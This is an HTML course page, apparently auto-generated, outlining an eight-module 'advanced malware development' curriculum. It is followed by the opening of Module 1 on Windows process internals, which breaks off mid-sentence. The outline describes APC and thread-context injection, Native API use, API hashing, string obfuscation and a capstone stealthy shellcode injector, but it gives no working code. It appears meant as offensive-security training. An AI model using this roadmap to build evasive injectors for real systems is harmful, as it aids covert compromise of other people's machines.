<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>hackerpath_maldev2</title>
    <link rel="stylesheet" href="../style.css">
</head>
<body>
    <div class="container">
        
        <p><a href="../index.html">‚Üê Back to Course Catalog</a></p>

        <!-- Header Area -->
        <div class="course-header">
             <span class="category-tag">Category Placeholder</span> <!-- Add category data if available -->
            <h1>hackerpath_maldev2</h1>
            <p class="course-description">Description placeholder based on folder name</p> <!-- Add description data if available -->
            <div class="course-stats">
                <span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock h-5 w-5 mr-2 text-primary"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Duration Placeholder</span> <!-- Add duration data if available -->
                <span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-layers h-5 w-5 mr-2 text-primary"><path d="m12 18-6-6-4 4 10 10 10-10-4-4-6 6"/><path d="m12 18v4"/><path d="m2 12 10 10"/><path d="M12 18 22 8"/><path d="M6 6 10 2l10 10"/></svg> 8 Modules</span>
                <span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-zap h-5 w-5 mr-2 text-primary"><path d="M13 2v10h6l-7 10v-10H5z"/></svg> Difficulty Placeholder</span> <!-- Add difficulty data if available -->
            </div>
            <button>Start Learning</button>
        </div>

        <!-- Course Body: Tabs Navigation -->
        <!-- Added relative positioning to tabs-nav for potential dropdown positioning -->
        <div class="course-tabs-nav" style="position: relative;">
             <!-- Links use data attributes for JS handling and #hashes for history -->
             <a href="#overview" class="tab-link active" data-view="overview">Overview</a>
             <!-- Course Content tab now acts as a dropdown toggle -->
             <a href="#course-content" class="tab-link" data-view="course-content-toggle">Course Content</a>
             <a href="#discussion" class="tab-link disabled" data-view="discussion">Discussion (Static)</a>
        </div>
        <!-- The dropdown menu will be dynamically created and appended near the tabs nav -->


        <!-- Course Body: Content Area (Two-Column Layout) -->
        <!-- This grid structure is always present on course pages -->
        <div class="course-body-grid">
            <div class="main-content-column">
                 <!-- Content will be loaded here by JS -->
                 <!-- Initial content is Overview (handled by JS on load) -->
                 <!-- The 'card main-content-card' is now part of the fragment HTML itself -->
            </div>
            <div class="sidebar-column">
                 <!-- Sidebar content (only for overview) will be loaded here by JS -->
            </div>
        </div>

         <!-- Hidden container for content fragments and data -->
         <!-- Store fragments and raw data as JSON string for easier parsing in JS -->
        <script id="course-fragments" type="application/json">
        {
  "overview": "\n        <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n            <h2>About This Course</h2>\n            <div class=\"markdown-content\">\n                <p>Alright team, let&#39;s dive deep into the fascinating world of advanced malware development. This isn&#39;t about building simple script-kiddie tools; we&#39;re talking about understanding the fundamental mechanics of Windows execution, memory management, and process interaction at a level that allows us to execute code stealthily and resiliently. My goal here isn&#39;t just to show you <em>how</em> to do cool offensive things, but to help you understand <em>why</em> they work, the underlying principles, and how defenders might try to stop them. We&#39;ll build this knowledge piece by piece, drawing inspiration from places like <code>zhasslan.txt</code> and my own experiences in the field. Get ready to learn, build, and maybe break a few things in your isolated lab environments!</p>\n<p>Here is the comprehensive 8-module course outline:</p>\n<hr>\n<p><strong>Course Title:</strong> Advanced Malware Development: Code Execution, Injection, and Evasion Techniques (Modules 9-16)</p>\n<p><strong>Overall Course Objective:</strong> By the end of this course, learners will be able to design and implement a sophisticated tool capable of injecting and executing code within a target process using multiple advanced techniques (APCs, Native API, Fibers, Unconventional methods) while employing dynamic API resolution and other evasion strategies, effectively creating a functional clone of the core concepts discussed in this topic.</p>\n<p><strong>Target Audience:</strong> Learners with basic proficiency in C/C++, a foundational understanding of Windows operating system concepts (processes, threads, memory), and some exposure to assembly language or reverse engineering tools. Prior basic knowledge of malware development concepts (like simple <code>CreateRemoteThread</code> injection) is beneficial but not strictly required, as we will build upon and move beyond these.</p>\n<hr>\n<p><strong>Module 1: Setting the Stage - Advanced Process Internals and Execution Contexts</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Understand the advanced architecture of Windows processes, threads, and memory, and identify the different execution contexts available for code injection beyond simple thread creation.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Deep dive into Process Address Space Layout (User-mode vs. Kernel-mode, key regions).</li>\n<li>Detailed look at Threads: States, scheduling, and the Thread Information Block (TIB).</li>\n<li>Introduction to Fibers: How they differ from threads and their purpose.</li>\n<li>The Portable Executable (PE) format revisited: Focus on Import Address Table (IAT) and Export Address Table (EAT).</li>\n<li>User-mode vs. Native API (<code>kernel32.dll</code> vs. <code>ntdll.dll</code>) and their relationship.</li>\n<li>Why go beyond basic <code>CreateRemoteThread</code> and <code>WriteProcessMemory</code>? Limitations and detection vectors of simple injection.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li><code>Windows Internals</code> book (relevant chapters on Processes, Threads, Memory Management).</li>\n<li>Microsoft Docs (MSDN) on Processes, Threads, and PE Format.</li>\n<li>Basic C/C++ programming environment setup (Visual Studio or GCC/Clang with MinGW/Cygwin).</li>\n<li>A debugger like WinDbg or x64dbg.</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Analyze a running process (like <code>notepad.exe</code>) using a debugger to: 1) Enumerate its threads and observe their states. 2) Identify loaded modules (<code>.dll</code>s) and locate their base addresses. 3) Examine the PE header of a loaded DLL (<code>kernel32.dll</code> or <code>ntdll.dll</code>) to locate the Data Directory and specifically the Export Directory RVA. Write a simple C++ program that uses <code>OpenProcess</code> and <code>EnumProcessThreads</code> to list thread IDs of a target process.</li>\n</ul>\n<p><strong>Module 2: Hijacking Execution - Asynchronous Procedure Calls (APCs)</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Learn how Asynchronous Procedure Calls (APCs) function and implement code to queue and trigger execution of arbitrary code within a target thread using APCs.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>What are APCs? User-Mode vs. Kernel-Mode APCs.</li>\n<li>The APC Queue and how it&#39;s processed by threads.</li>\n<li>The concept of a thread being in an &quot;Alertable State&quot;.</li>\n<li>Key Native API functions for APCs: <code>NtQueueApcThread</code> (or WinAPI wrapper <code>QueueUserAPC</code>).</li>\n<li>Practical implementation: Writing an injector that allocates memory in a target process and queues an APC to an existing thread to execute code in that memory.</li>\n<li>Limitations, common pitfalls, and detection considerations for APC injection.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Microsoft Docs on APCs and <code>QueueUserAPC</code>.</li>\n<li>Analysis of APC injection examples found in security research blogs.</li>\n<li>Understanding of function pointers and calling conventions.</li>\n<li><em>Prerequisite:</em> Module 1 concepts (Processes, Threads, Memory allocation).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Develop a C++ tool that takes a process ID and shellcode (e.g., a small payload to spawn <code>calc.exe</code> or display a message box) as input. The tool should find a suitable thread in the target process, allocate executable memory, write the shellcode, and queue an APC to the thread to execute the shellcode.</li>\n</ul>\n<p><strong>Module 3: Deeper Access - Leveraging Native API and Undocumented Functions</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Understand the structure and purpose of the Native API (<code>ntdll.dll</code>) and learn techniques for finding and calling both documented and undocumented Native API functions for more stealthy operations.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>The relationship between WinAPI (<code>kernel32.dll</code>, <code>user32.dll</code>, etc.) and Native API (<code>ntdll.dll</code>).</li>\n<li>Why bypass WinAPI and call Native API directly? Reducing import footprint, accessing lower-level features.</li>\n<li>Methods for calling Native API functions: Using <code>GetProcAddress</code> (as a starting point before dynamic resolution) and manual function pointer casting.</li>\n<li>Exploring <code>ntdll.dll</code>: Key function prefixes (<code>Nt</code>, <code>Zw</code>).</li>\n<li>Finding Undocumented Functions: Analyzing <code>ntdll.dll</code> exports, using tools (Process Explorer, Process Monitor, API monitors), reverse engineering techniques. (Reference <code>zhasslan.txt</code> concepts on interacting with lower-level OS structures).</li>\n<li>Practical examples: <code>NtCreateThreadEx</code> (a more powerful thread creation API), <code>NtAllocateVirtualMemory</code>, <code>NtProtectVirtualMemory</code>.</li>\n<li>Risks and stability issues with undocumented APIs.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Disassembly of <code>ntdll.dll</code>.</li>\n<li>Sysinternals tools (Process Explorer, Process Monitor).</li>\n<li>Unofficial documentation resources for Native/Undocumented APIs.</li>\n<li><em>Prerequisite:</em> Module 1 concepts (Native API introduction), Module 2 concepts (memory allocation, thread creation context).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Rewrite the remote code execution logic from Module 2&#39;s project (or a simplified version) to use Native API functions (<code>NtAllocateVirtualMemory</code>, <code>NtWriteVirtualMemory</code>, <code>NtCreateThreadEx</code>) instead of their WinAPI counterparts (<code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThreadEx</code>). Observe the difference in imported functions in your executable.</li>\n</ul>\n<p><strong>Module 4: Alternative Execution - Fibers and Manual Context Manipulation</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Learn about Windows Fibers and how to leverage them for code execution, and understand basic manual thread context manipulation techniques used in advanced shellcode.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Fibers vs. Threads: Execution context switching, scheduling differences.</li>\n<li>Creating and managing Fibers: <code>ConvertThreadToFiber</code>, <code>CreateFiber</code>, <code>SwitchToFiber</code>.</li>\n<li>Using Fibers for code execution: Injecting code and creating/switching to a Fiber that executes it.</li>\n<li>Manual Thread Context Manipulation: Using <code>GetThreadContext</code> and <code>SetThreadContext</code> to hijack or redirect a thread&#39;s execution flow.</li>\n<li>Introduction to inline assembly (or compiler intrinsics) for low-level operations like context saving/restoring or executing small payload stubs directly.</li>\n<li>Case Study: How some packers or shellcode loaders use context manipulation.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Microsoft Docs on Fibers and Thread Context.</li>\n<li>Assembly language basics (x86/x64 registers, stack, calling conventions).</li>\n<li>Examples of shellcode that uses <code>GetThreadContext</code>/<code>SetThreadContext</code>.</li>\n<li><em>Prerequisite:</em> Module 1 concepts (Threads, Execution Contexts), Module 3 concepts (Native API for potential context manipulation functions).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Implement a simple program that converts the main thread to a Fiber, creates a new Fiber executing a different function, and switches between them. <em>Stretch Goal:</em> Modify your remote injection tool to allocate memory in the target process, write shellcode, and then either: 1) Create a <em>remote Fiber</em> to execute the shellcode (if feasible for your target OS version/architecture) OR 2) Use <code>GetThreadContext</code>/<code>SetThreadContext</code> on a target thread to redirect its execution pointer to your shellcode (requires careful state saving/restoring).</li>\n</ul>\n<p><strong>Module 5: Thinking Outside the Box - Unconventional Execution Vectors</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Explore less common and more creative methods for achieving code execution within a target process by leveraging standard Windows features in unconventional ways.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Execution via Window Messages: Using <code>SendMessage</code> or <code>PostMessage</code> with data payloads (e.g., <code>WM_COPYDATA</code>) to pass pointers or code to a window procedure running in the target process.</li>\n<li>Leveraging Desktop and Window Enumeration: How <code>EnumDesktops</code>, <code>EnumChildWindows</code>, <code>EnumWindows</code> can sometimes be abused if callback functions are not handled securely (less direct execution, more about finding attack surfaces or triggering existing code paths).</li>\n<li>Abusing Callbacks and Timers: Briefly discuss how registering callbacks (like timer callbacks via <code>SetTimer</code>) in a target process&#39;s thread can be used as an execution trigger (requires obtaining a thread handle).</li>\n<li>Injecting into specific GUI-related contexts.</li>\n<li>Case Study: Analyze a real-world example (or a simplified scenario) where malware used window messages or other unconventional means to execute or communicate.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Microsoft Docs on Windowing API, Messages (<code>WM_COPYDATA</code>), Desktops, Enumeration functions.</li>\n<li>Analysis of malware or red team tools that employ these techniques.</li>\n<li><em>Prerequisite:</em> Module 1 concepts (Processes, Threads), basic understanding of Windows GUI programming concepts (windows, messages, threads owning windows).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Write a tool that enumerates top-level windows and child windows in a target process. <em>Stretch Goal:</em> Implement a proof-of-concept that sends a <code>WM_COPYDATA</code> message containing a small data buffer or a pointer to a memory location in the target process, targeting a known window handle in that process. (Note: Achieving <em>arbitrary code execution</em> purely via <code>WM_COPYDATA</code> is complex and often relies on vulnerabilities, but understanding the data transfer mechanism is key).</li>\n</ul>\n<p><strong>Module 6: Stealth Operations - Dynamic API Resolution and Export Tables</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Understand the necessity of hiding API calls from static analysis and implement the core logic to dynamically resolve required API function addresses at runtime by parsing the Portable Execable (PE) format&#39;s Export Directory.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>The problem with static imports (Import Address Table - IAT) for malware.</li>\n<li>How the Windows loader resolves imports dynamically.</li>\n<li>In-depth structure of the PE Export Directory Table (EAT).</li>\n<li>Manually parsing the PE header: Locating the DOS Header, NT Headers, Optional Header, Data Directories.</li>\n<li>Navigating the Export Address Table, Address-of-Name Pointers, and Ordinal Table.</li>\n<li>Algorithm for implementing a basic <code>GetProcAddress</code>-like function by walking the EAT.</li>\n<li>Resolving the initial crucial APIs: <code>LoadLibrary</code> and <code>GetProcAddress</code> themselves (or their Native API equivalents) to kickstart dynamic resolution. (Reference <code>zhasslan.txt</code> concepts on manual PE parsing and avoiding standard library calls).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Detailed specifications of the PE File Format.</li>\n<li>Tools for analyzing PE files (PE-Bear, CFF Explorer).</li>\n<li>C/C++ pointer arithmetic and structure manipulation.</li>\n<li><em>Prerequisite:</em> Module 1 concepts (PE structure, Module base addresses).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Write a C++ function (or a standalone program) that takes a module base address (e.g., obtained via <code>GetModuleHandleA</code> for now) and a function name string as input. This function should manually parse the PE header of the module at that base address and traverse the Export Directory structures to find and return the address of the requested function. Test it by resolving functions like <code>CreateProcessA</code> from <code>kernel32.dll</code>.</li>\n</ul>\n<p><strong>Module 7: Advanced Evasion - Hiding API Calls and Other Techniques</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Implement advanced techniques to further obscure the use of system APIs and the presence of malicious code, including hashing API names, string obfuscation, and understanding the role of direct syscalls.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Improving dynamic resolution: Using hashes of API names instead of cleartext strings for lookup in the EAT traversal. Implementing a suitable hashing algorithm (e.g., ROR13, DJB2).</li>\n<li>String obfuscation techniques: XORing, encoding, or generating strings at runtime to hide DLL and function names used in the loader/shellcode.</li>\n<li>Introduction to Direct System Calls (Syscalls): Bypassing the <code>ntdll.dll</code> wrapper functions to call the kernel directly. Understanding the syscall mechanism, syscall stubs, and the challenges (OS version dependency, detection via syscall monitoring). (Brief overview, as full implementation is complex).</li>\n<li>Position-Independent Code (PIC) and its importance for shellcode and advanced payloads.</li>\n<li>Simple code obfuscation and anti-analysis tricks (e.g., simple anti-debugging checks, junk code).</li>\n<li>Case Study: Examine how sophisticated malware families (like Emotet, TrickBot) employ layers of evasion, including API hashing and string obfuscation. (Reference <code>zhasslan.txt</code> concepts on obfuscation and stealth).</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Articles and tutorials on malware evasion techniques (API hashing, string obfuscation).</li>\n<li>Resources on Windows syscalls (syscall tables for specific OS versions).</li>\n<li>Examples of obfuscated code.</li>\n<li><em>Prerequisite:</em> Module 6 concepts (Dynamic API Resolution, PE parsing).</li>\n</ul>\n</li>\n<li><strong>Module Project/Exercise:</strong> Enhance the dynamic API resolution code from Module 6: 1) Modify it to accept a hash of the function name instead of the string, calculating hashes on the fly during EAT traversal. 2) Implement a simple XOR-based string obfuscation routine and use it to hide the DLL names (&quot;kernel32.dll&quot;, &quot;ntdll.dll&quot;) and potentially some function names within your loader code.</li>\n</ul>\n<p><strong>Module 8: Capstone Project - Building Your Advanced Execution Framework</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Integrate the advanced techniques learned throughout the course into a single, functional tool capable of executing arbitrary shellcode in a target process using multiple stealthy and resilient methods, demonstrating mastery of the course material.</li>\n<li><strong>Essential Subtopics:</strong><ul>\n<li>Review and consolidate all learned techniques: APCs, Native API calls, Fibers (if applicable), Unconventional ideas, Dynamic API Resolution (hashing, obfuscation).</li>\n<li>Designing the architecture of your advanced injector/loader tool: How to select methods, handle configuration, and manage payloads.</li>\n<li>Combining techniques: Using dynamic resolution to call Native API functions which queue APCs or create Fibers.</li>\n<li>Implementing the core injection logic using at least two different advanced methods covered (e.g., APC and Native <code>NtCreateThreadEx</code>).</li>\n<li>Ensuring dynamic API resolution (with hashing/obfuscation) is used for <em>all</em> Windows/Native API calls within your injector logic.</li>\n<li>Testing and debugging your advanced payloads in a safe, isolated environment (virtual machine).</li>\n<li>Brief overview of defensive countermeasures against these techniques and ethical considerations for security research.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>All resources and code developed in Modules 1-7.</li>\n<li>A dedicated virtual machine for safe testing.</li>\n<li>A small, safe shellcode payload (e.g., <code>calc.exe</code> spawn code).</li>\n<li><em>Prerequisite:</em> Successful completion and understanding of all previous modules.</li>\n</ul>\n</li>\n<li><strong>Module Capstone Project:</strong> Develop a command-line tool (or simple GUI) that takes a target process ID and a raw shellcode file as input. The tool should offer command-line arguments or a simple configuration to choose between at least two different advanced injection methods learned (e.g., APC injection, Native <code>NtCreateThreadEx</code> injection). The tool <em>must</em> use your dynamic API resolution code (with hashing/obfuscation) to resolve <em>all</em> necessary API functions (<code>OpenProcess</code>, memory allocation functions, thread/APC creation functions, etc.) rather than relying on static imports or standard <code>GetProcAddress</code>. The final output is a working tool capable of injecting and executing the provided shellcode using these advanced, stealthy techniques.</li>\n</ul>\n<hr>\n<p>This outline provides a solid structure for exploring advanced code execution and evasion. We&#39;ll move from understanding the low-level mechanics to implementing sophisticated techniques, always keeping an eye on how defenders might spot us and how we can adapt. Remember, the best way to defend against these techniques is to understand them deeply, and that&#39;s exactly what we&#39;re going to do, hands-on. Let&#39;s build!</p>\n\n            </div>\n            <h2 class=\"module-list-heading\">Course Content</h2> <!-- Add heading for module list -->\n            <ul class=\"module-list\">\n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-1\" data-view=\"module-1\" data-module-order=\"1\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 1: module_1</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_1 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-2\" data-view=\"module-2\" data-module-order=\"2\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 2: module_2</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_2 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-3\" data-view=\"module-3\" data-module-order=\"3\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 3: module_3</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_3 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-4\" data-view=\"module-4\" data-module-order=\"4\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 4: module_4</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_4 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-5\" data-view=\"module-5\" data-module-order=\"5\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 5: module_5</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_5 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-6\" data-view=\"module-6\" data-module-order=\"6\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 6: module_6</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_6 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-7\" data-view=\"module-7\" data-module-order=\"7\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 7: module_7</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_7 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-8\" data-view=\"module-8\" data-module-order=\"8\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 8: module_8</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_8 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        </ul> <!-- Include the module list for Overview -->\n        </div>\n    ",
  "modules": {
    "module-1": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 1: module_1</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Okay team, strap in! Welcome to Module 1. This is where we build the rock-solid foundation upon which all our advanced techniques will rest. Forget the surface-level stuff; we&#39;re going deep into the mechanics of how Windows actually runs code. Think of this as learning the blueprints before you start building a skyscraper ‚Äì you need to know where the load-bearing walls are, how the plumbing works, and the difference between a beam and a joist.</p>\n<p>Our goal in this module is to get intimately familiar with the environment our malware will operate in: the Windows process. We&#39;ll dissect it, understand its components, and see the different ways code can exist and execute within it. This isn&#39;t just theory; this knowledge directly informs <em>why</em> certain injection and evasion techniques work, and why others fail or get caught.</p>\n<hr>\n<h2><strong>Module 1: Setting the Stage - Advanced Process Internals and Execution Contexts</strong></h2>\n<p><strong>Time Allotment:</strong> (Estimate: 4-6 hours, including exercises)</p>\n<p><strong>Module Objective Recap:</strong> Understand the advanced architecture of Windows processes, threads, and memory, and identify the different execution contexts available for code injection beyond simple thread creation.</p>\n<p><strong>Prerequisites Recap:</strong></p>\n<ul>\n<li>Basic C/C++ coding skills.</li>\n<li>Familiarity with fundamental Windows concepts (what a process is, what a thread is at a high level).</li>\n<li>A working C/C++ development environment (Visual Studio, MinGW/GCC, or Cygwin/Clang).</li>\n<li>A debugger (WinDbg or x64dbg recommended).</li>\n<li>Ideally, a dedicated Virtual Machine for lab work ‚Äì <em>seriously, use a VM for this stuff!</em></li>\n</ul>\n<hr>\n<h3><strong>1.1 The Windows Process: More Than Just an Executable</strong></h3>\n<p>Alright, let&#39;s start with the fundamental container: the process. You probably know it as &quot;an instance of a running program.&quot; That&#39;s true, but it&#39;s much more. A process is an isolated environment provided by the operating system to contain and manage the resources needed for a program to run.</p>\n<p><strong>What&#39;s in a Process?</strong></p>\n<p>Think of a process as a self-contained universe for your program. Its key components include:</p>\n<ul>\n<li><strong>Private Virtual Address Space:</strong> This is <em>crucial</em>. Every process gets its <em>own</em> virtual memory space. On 64-bit Windows, this space is a massive 128 Terabytes (though typically only a fraction is actually used or addressable by user-mode code). On 32-bit Windows, it&#39;s 4GB (with variations depending on configuration). Why virtual? Because the addresses your program sees (virtual addresses) are translated by the CPU&#39;s Memory Management Unit (MMU) with help from the OS into physical RAM addresses. This provides isolation ‚Äì one process cannot directly access the memory of another process without explicit OS permission (which we&#39;ll leverage!).</li>\n<li><strong>Executable Code:</strong> The program&#39;s instructions, loaded from the <code>.exe</code> file and any required <code>.dll</code> files.</li>\n<li><strong>Data:</strong> Global variables, static variables, dynamically allocated memory (heap).</li>\n<li><strong>Resources:</strong> Handles to objects like files, network sockets, synchronization objects 